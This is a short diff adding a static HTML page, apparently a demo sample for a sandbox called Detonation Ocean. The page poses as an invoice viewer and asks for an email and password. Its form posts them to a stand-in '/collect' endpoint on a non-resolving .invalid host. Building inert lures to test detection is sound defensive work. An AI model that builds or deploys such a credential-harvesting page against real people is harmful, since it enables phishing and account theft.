@@ -1,0 +1,17 @@
+<!-- Demo sample for Detonation Ocean. Refuses to run outside the sandbox. -->
+<!-- Static page: no script runs, and the only form posts to a .invalid host that does not resolve. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Invoice viewer</title>
+</head>
+<body>
+  <h1>Sign in to view invoice</h1>
+  <form method="POST" action="https://login.example.invalid/collect">
+    <label>Email <input type="email" name="username"></label>
+    <label>Password <input type="password" name="password"></label>
+    <button type="submit">Sign in</button>
+  </form>
+</body>
+</html>
